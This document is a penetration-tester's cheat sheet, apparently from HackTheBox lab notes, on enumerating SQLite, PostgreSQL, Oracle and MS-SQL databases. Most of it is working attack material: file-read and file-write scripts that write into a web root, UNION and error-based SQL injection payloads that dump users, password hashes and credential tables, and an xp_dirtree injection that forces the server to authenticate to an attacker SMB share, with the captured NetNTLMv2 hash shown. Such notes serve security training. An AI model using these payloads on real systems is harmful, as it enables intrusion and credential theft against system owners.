# Enumerating Non-MySQL DBs

## SQLite

If you get an sqlite DB, you can use Kali's `sqlite3` to enumerate it.

```shell
root@Kali:~/HTB/Doctor/DBs# sqlite3 clean_site.db
SQLite version 3.27.2 2019-02-25 16:06:06
Enter ".help" for usage hints.
sqlite> .databases
main: /root/HTB/Doctor/DBs/clean_site.db
sqlite> .tables
post  user
sqlite> select * from user;
1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
sqlite> select * from post;
1|Doctor blog|2020-09-18 20:48:37.55555|A free blog to share medical knowledge. Be kind!|1
```

or you can just dump the DB with `sqlite3 Audit.db .dump`

## Postgresql

Connect to it, note that here I specified a DB in advance.

```shell
root@Kali:~/HTB/Bitlab# psql -U profiles -h localhost -p 5433 profiles
Password for user profiles: 
psql (11.3 (Debian 11.3-1), server 10.4 (Ubuntu 10.4-2.pgdg18.04+1))
Type "help" for help.

profiles=>
```

List DBs available

```shell
profiles=> \list
                             List of databases
   Name    |  Owner   | Encoding | Collate | Ctype |   Access privileges   
-----------+----------+----------+---------+-------+-----------------------
 gitlab    | postgres | UTF8     | C       | C     | =Tc/postgres         +
           |          |          |         |       | postgres=CTc/postgres+
           |          |          |         |       | gitlab=CTc/postgres
 postgres  | postgres | UTF8     | C       | C     | 
 profiles  | postgres | UTF8     | C       | C     | =Tc/postgres         +
           |          |          |         |       | postgres=CTc/postgres+
           |          |          |         |       | profiles=CTc/postgres
 template0 | postgres | UTF8     | C       | C     | =c/postgres          +
           |          |          |         |       | postgres=CTc/postgres
 template1 | postgres | UTF8     | C       | C     | =c/postgres          +
           |          |          |         |       | postgres=CTc/postgres
(5 rows)
```

To change DBs

```shell
profiles=> \c gitlab
psql (11.3 (Debian 11.3-1), server 10.4 (Ubuntu 10.4-2.pgdg18.04+1))
You are now connected to database "gitlab" as user "profiles".
gitlab=>
```

List tables in DB

```shell
profiles=> \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | profiles | table | profiles
(1 row)
```

Select all rows in table

```shell
profiles=> SELECT * from profiles;
 id | username |        password        
----+----------+------------------------
  1 | clave    | c3NoLXN0cjBuZy1wQHNz==
(1 row)
```

If you have user postgres can read file

```postgresql
postgres=# SELECT pg_read_file('/etc/hosts');
                        pg_read_file
------------------------------------------------------------
 127.0.0.1       localhost                                 +
 127.0.1.1       nibbles                                   +
                                                           +
 # The following lines are desirable for IPv6 capable hosts+
 ::1     localhost ip6-localhost ip6-loopback              +
 ff02::1 ip6-allnodes                                      +
 ff02::2 ip6-allrouters                                    +

(1 row)
```

and ls dirs

```postgresql
postgres=# SELECT pg_ls_dir('/home/wilson');
   pg_ls_dir
---------------
 .bash_logout
 .gnupg
 .bash_history
 .profile
 local.txt
 .bashrc
 ftp
(7 rows)
```

## Oracle DB

Refer to [this](https://github.com/ivanitlearning/CTF-Repos/blob/master/HTB/Silo/Enumerating-Oracle-DB.md) for enumerating DB contents.

Reading files. Use script [from here](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-rce-and-more#read-write-files)

```text
root@kali:~/CTF/HTB/Silo# cat read_hosts.sql

SET SERVEROUTPUT ON
declare
f utl_file.file_type;
sBuffer Varchar(8000);
begin
f:=UTL_FILE.FOPEN ('C:/Windows/System32/drivers/etc','hosts','r');
loop
UTL_FILE.GET_LINE (f,sBuffer);
DBMS_OUTPUT.PUT_LINE(sBuffer);
end loop;
EXCEPTION
when no_data_found then
UTL_FILE.FCLOSE(f);
end;
/

root@kali:~/CTF/HTB/Silo# rlwrap -r sqlplus scott/tiger@10.10.10.82:1521/XE 'as sysdba'

SQL*Plus: Release 19.0.0.0.0 - Production on Fri Dec 25 19:58:40 2020
Version 19.9.0.0.0

Copyright (c) 1982, 2020, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> @read_hosts.sql
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host
# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost

PL/SQL procedure successfully completed.
```

Writing files (upload to DB server)

Use this [.sql script](https://github.com/0xdea/exploits/blob/master/oracle/raptor_orafile.sql). This writes test.txt consisting of "Testing write" to C:\inetpub\wwwroot.

```text
root@kali:~/CTF/HTB/Silo# rlwrap -r sqlplus scott/tiger@10.10.10.82:1521/XE 'as sysdba'

SQL*Plus: Release 19.0.0.0.0 - Production on Fri Dec 25 20:00:24 2020
Version 19.9.0.0.0

Copyright (c) 1982, 2020, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> @raptor_orafile.sql

Procedure created.


Procedure created.

SQL> exec utlwritefile('C:/inetpub/wwwroot', 'test.txt', 'Testing write');

PL/SQL procedure successfully completed.
```

This is a very [useful reference](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html) for SQLI, noting in particular that you can't just `SELECT ` without specifying `FROM`.

### SQLI tips (for UNION injection)

Assuming injection via POST

#### Find number of cols

Increment this until there's error (similar to MySQL)

`user=1' order by 3--`

#### Find visible columns

`user=1' UNION SELECT null,null,null FROM dual--`

returns

> Entry from null with title null from 0

`user=1' UNION SELECT '1','2',null FROM dual--`

> Entry from 1 with title 2 from 0

This means cols 1, 2 are visible.

#### Enumerating DBMS

Find DB name in use

`user=1' UNION SELECT '1',ora_database_name,null FROM dual--`

> Entry from 1 with title XE from 0

DB name is XE

Find DB user

`user=1' UNION SELECT '1',user,null FROM dual--`

> Entry from 1 with title WEB_APP from 0

Find DBMS version

`user=1' UNION SELECT '1',(select banner from v$version where rownum=1),null FROM dual--`

> Entry from 1 with title Oracle Database 18c Express Edition Release 18.0.0.0.0 - Production from 0

#### List tables

This one seems to spit out all the tables

`user=1' UNION SELECT '1',table_name,null FROM all_tables--`

```text
** snip **
Entry from 1 with title WEB_ADMINS from 0<BR>
Entry from 1 with title WEB_CONTENT from 0<BR>
Entry from 1 with title WEB_USERS from 0<BR>
** snip **
```

#### List cols from table "WEB_ADMINS"

`user=1' UNION SELECT '1',column_name,null FROM all_tab_columns WHERE table_name='WEB_ADMINS'--`

```text
Blog entry from 1 with title ADMIN_ID from 0<BR>
Blog entry from 1 with title ADMIN_NAME from 0<BR>
Blog entry from 1 with title PASSWORD from 0<BR>
```

#### Retrieve rows from table "WEB_ADMINS"

`user=1' UNION SELECT '1',admin_name||password,null FROM WEB_ADMINS--`

> Entry from 1 with title admind82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 from 0<BR>

Note the admin_name and password are concatenated. If possible split them into separate fields

`user=1' UNION SELECT admin_name,password,null FROM WEB_ADMINS--`

> Entry from admin with title d82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 from 0<BR>


# MS-SQL (SQL Server)

Assuming GET injection here. 

Always true:
`http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=13 AND 1=1;-- -`


Always false:

`http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=13 AND 1=2;-- -`

### UNION injection

Find number of columns

`GET /mvc/Product.aspx?ProductSubCategoryId=13 UNION SELECT null;-- -`

Increase null by 1 each time until you get a different response

`GET /mvc/Product.aspx?ProductSubCategoryId=13 UNION SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;-- -`

If adding one after that produces the error then we know it's 25 cols.

Testing for visible columns

`http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=13 UNION SELECT null,'col2','col3',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;-- -`

See which is visible in the output.

#### Enumerate DBMS version and current user

`http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=13 UNION SELECT null,@@version,CURRENT_USER,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;-- -`

#### Listing the DBs

`http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=13 UNION SELECT null,name,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM master..sysdatabases;;-- -`

#### List DB users

`http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=13 UNION SELECT null,name,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM master..syslogins;-- -`

#### Check user privs

Cast to string first

`http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=13 UNION SELECT null,cast(is_srvrolemember('sysadmin') AS VARCHAR),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;-- -`

returns 0 here, so we are not admin.

#### Grab password_hash

`http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=13 UNION SELECT null,name,password_hash,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM master.sys.sql_logins;-- -`

#### Make DBMS query Kali share

`http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=13 UNION SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;exec master.dbo.xp_dirtree '\\10.10.14.78\kali';-- -`

Then on Kali we see

```text
root@kali:~/CTF/HTB/Giddy# impacket-smbserver -smb2support kali .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.104,49715)
[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)
[*] User GIDDY\Stacy authenticated successfully
[*] Stacy::GIDDY:aaaaaaaaaaaaaaaa:244de36a238a34c001347adfcb87b65a:0101000000000000006cfb328bfcd6012ceb2ef3b80b112d00000000010010007100660072007700760064006c007700030010007100660072007700760064006c007700020010004f004b0050007a007a00580059005200040010004f004b0050007a007a0058005900520007000800006cfb328bfcd601060004000200000008003000300000000000000000000000003000006c251068f8f7d5d63213bbb2423f770d3004738166b645785b4b9d5fbbcb19280a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0037003800000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:kali)
```

### Error-based injection

#### List DBs

The trick is to cast strings to int which will fail and return an error listing the string. This guide assumes POST request to a parameter . The + used concatenates the entry

`' + cast((SELECT db_name(1)) as int) + '`

> Conversion failed when converting the nvarchar value 'master' to data type int.

Increment the number until you don't have error-based response anymore. Then we have all the DBs listed

1. master
2. tempdb
3. model
4. msdb
5. news
6. backup

#### Enumerating tables of DB 'news'

`SELECT STRING_AGG(name,',') FROM news..sysobjects`

Adding error-based SQLI syntax

`' + cast((SELECT STRING_AGG(name,',') FROM news..sysobjects) as int) + '`

returns

> Conversion failed when converting the nvarchar value 'userslist,PK_users_B9BE370FA2D7A434,QueryNotificationErrorsQueue,queue_messages_1977058079,EventNotificationErrorsQueue,queue_messages_2009058193,ServiceBrokerQueue,queue_messages_2041058307' to data type int.

with comma as separator. If you want to split by newlines can do [this](https://stackoverflow.com/a/31174/7908040)

`SELECT STRING_AGG(name,char(13)+char(10)) FROM news..sysobjects`

#### Enumerating columns of table 'passwordlist' from DB 'backup'

`SELECT STRING_AGG(backup..syscolumns.name,'~') FROM backup..syscolumns, backup..sysobjects WHERE backup..syscolumns.id=backup..sysobjects.id AND backup..sysobjects.name='passwordlist'`

With SQLI error syntax

`' + cast((SELECT STRING_AGG(backup..syscolumns.name,'~') FROM backup..syscolumns, backup..sysobjects WHERE backup..syscolumns.id=backup..sysobjects.id AND backup..sysobjects.name='passwordlist') as int) + '`

returns

> Conversion failed when converting the nvarchar value 'login~id~pass' to data type int.

So there are three cols

1. login
2. id
3. pass

#### Enumerating specific rows of table 'passwordlist' from DB 'backup'

This one uses ~ as separator and concats it, then each row is then string_agg again.

`SELECT STRING_AGG(CONCAT(login,'~',id,'~',pass),',') FROM backup.dbo.passwordlist`

After casting becomes

`' + cast((SELECT STRING_AGG(CONCAT(login,'~',id,'~',pass),',') FROM backup.dbo.passwordlist) as int) + '`

returns

> Conversion failed when converting the varchar value 'ftp~0~7de6b6f0afminus90c3ed558da43930181,webadm~1~5b413fe170836079622f413afe6ef2d,admin~2~4jg95b99b8623362b466efb7203fd182,erica~3~g94jh8be3c78be06d47b697468ad3b33b' to data type int.

Ref: 

1. https://c0deman.wordpress.com/2013/06/25/mssql-injection-cheat-sheet/
2. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
3. https://stackoverflow.com/a/28094416/7908040
4. https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
5. https://database.guide/the-sql-server-equivalent-to-group_concat/